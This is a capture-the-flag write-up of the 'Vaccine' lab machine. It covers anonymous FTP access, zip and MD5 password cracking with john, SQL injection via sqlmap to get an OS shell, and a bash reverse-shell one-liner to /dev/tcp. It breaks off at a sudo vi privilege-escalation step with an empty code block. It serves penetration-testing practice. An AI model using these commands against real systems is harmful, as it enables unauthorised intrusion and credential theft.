# Vaccine

First, we conduct an nmap scan:

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -sS -sV -Pn -p- 10.129.41.200
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-13 07:04 EDT
Nmap scan report for 10.129.41.200
Host is up (0.030s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.04 seconds
```

We can see that there is an FTP server running on the host. We try logging in as an anonymous user:

```
┌──(kali㉿kali)-[~/Desktop]
└─$ ftp 10.129.41.200 21
Connected to 10.129.41.200.
220 (vsFTPd 3.0.3)
Name (10.129.41.200:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

Login succeeds, and now we can list files located on the server. We can see `backup.zip` file. We transfer the file to our host machine:

```
ftp> ls
229 Entering Extended Passive Mode (|||10682|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
226 Directory send OK.
ftp> get backup.zip
local: backup.zip remote: backup.zip
229 Entering Extended Passive Mode (|||10911|)
150 Opening BINARY mode data connection for backup.zip (2533 bytes).
100% |***********************************************************************|  2533        2.14 MiB/s    00:00 ETA
226 Transfer complete.
2533 bytes received in 00:00 (87.85 KiB/s)
ftp> exit
221 Goodbye.
```

When trying to unzip the file, we can see that the password is needed. We can try to crack the password using `zip2john` and `john`:

```
┌──(kali㉿kali)-[~/Desktop]
└─$ zip2john backup.zip > hash.txt
ver 2.0 efh 5455 efh 7875 backup.zip/index.php PKZIP Encr: TS_chk, cmplen=1201, decmplen=2594, crc=3A41AE06 ts=5722 cs=5722 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/style.css PKZIP Encr: TS_chk, cmplen=986, decmplen=3274, crc=1B1CCD6A ts=989A cs=989a type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
```

```
┌──(kali㉿kali)-[~/Desktop]
└─$ john --wordlist=../rockyou.txt hash.txt                
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
741852963        (backup.zip)     
1g 0:00:00:00 DONE (2026-06-13 07:22) 33.33g/s 546133p/s 546133c/s 546133C/s 123456..cocoliso
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We succeeded, and now we can read the `index.php` file:

```
┌──(kali㉿kali)-[~/Desktop]
└─$ cat index.php
<!DOCTYPE html>
<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
  }
?>

...
...
...
```

We can see admin's username and md5 password hash harcoded in the file. We can try cracking the password hash using `john` again:

```
┌──(kali㉿kali)-[~/Desktop]
└─$ john --format=raw-md5 --wordlist=../rockyou.txt admin_hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
qwerty789        (?)     
1g 0:00:00:00 DONE (2026-06-13 07:27) 100.0g/s 10022Kp/s 10022Kc/s 10022KC/s roslin..pogimo
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

Now when we have admin credentials, we can login using the panel. When we do that, we are presented with "MegaCorp Car Catalogue". We can see an serach field in the top right corner of the webpage. Once we type in some SQL code, we can see that this component is vulnerable to SQL injection:

![alt text](../assets/Vaccine1.png)

Now we can utilize `sqlmap` to gain an system shell:

```
┌──(kali㉿kali)-[~/Desktop]
└─$ sqlmap -u http://10.129.41.200/dashboard.php?search=1 --cookie="PHPSESSID=a19ah4sqj8revakonj3accrt5s" --os-shell
        ___
       __H__                                                                                                        
 ___ ___[)]_____ ___ ___  {1.10.5#stable}                                                                           
|_ -| . [)]     | .'| . |                                                                                           
|___|_  [']_|_|_|__,|  _|                                                                                           
      |_|V...       |_|   https://sqlmap.org                                                                        

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:00:53 /2026-06-13/

...
...
...

[08:01:28] [INFO] fingerprinting the back-end DBMS operating system
[08:01:28] [INFO] the back-end DBMS operating system is Linux
[08:01:28] [INFO] testing if current user is DBA
[08:01:28] [INFO] retrieved: '1'
[08:01:28] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
[08:01:28] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> 
```

To gain a more stable shell, we can execute an reverse shell from our target host back to our machine:

```
os-shell> bash -c "bash -i >& /dev/tcp/10.10.15.228/4444 0>&1"
```

```
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.15.228] from (UNKNOWN) [10.129.41.200] 34584
bash: cannot set terminal process group (3160): Inappropriate ioctl for device
bash: no job control in this shell
postgres@vaccine:/var/lib/postgresql/11/main$ python3 -c "import pty;pty.spawn('/bin/bash')"
<ain$ python3 -c "import pty;pty.spawn('/bin/bash')"
postgres@vaccine:/var/lib/postgresql/11/main$
```

Now we can read the user flag:

```
postgres@vaccine:/var/lib/postgresql/11/main$ cd ~
cd ~
postgres@vaccine:/var/lib/postgresql$ ls
ls
11  user.txt
postgres@vaccine:/var/lib/postgresql$ cat user.txt 
cat user.txt
ec9b13ca4d6229cd5cc1e09980965bf7
postgres@vaccine:/var/lib/postgresql$ 
```

When we inspect an `dashboard.php` file located in `/var/www/html`, we can see plaintext password hardcoded in the file:

```
postgres@vaccine:/var/www/html$ cat dashboard.php
cat dashboard.php
<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>Admin Dashboard</title>
  <link rel="stylesheet" href="./dashboard.css">

...
...
...

      </tr>
    </thead>
    <tbody>
        <?php
        session_start();
        if($_SESSION['login'] !== "true") {
          header("Location: index.php");
          die();
        }
        try {
          $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
        }

...
...
...

<!-- partial -->
  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery.tablesorter/2.28.14/js/jquery.tablesorter.min.js'></script><script  src="./dashboard.js"></script>

</body>
</html>
```

Now we can login over SSH, and check binaries, which we can run using the `sudo` command:

```
postgres@vaccine:~$ sudo -l 
[sudo] password for postgres: 
Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH
    XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
postgres@vaccine:~$ 
```

We can see that we can run `/bin/vi /etc/postgresql/11/main/pg_hba.conf` with sudo permissions. We can check how to escalate our priviliges exploiting this vector at https://gtfobins.org/gtfobins/vi/:

```

```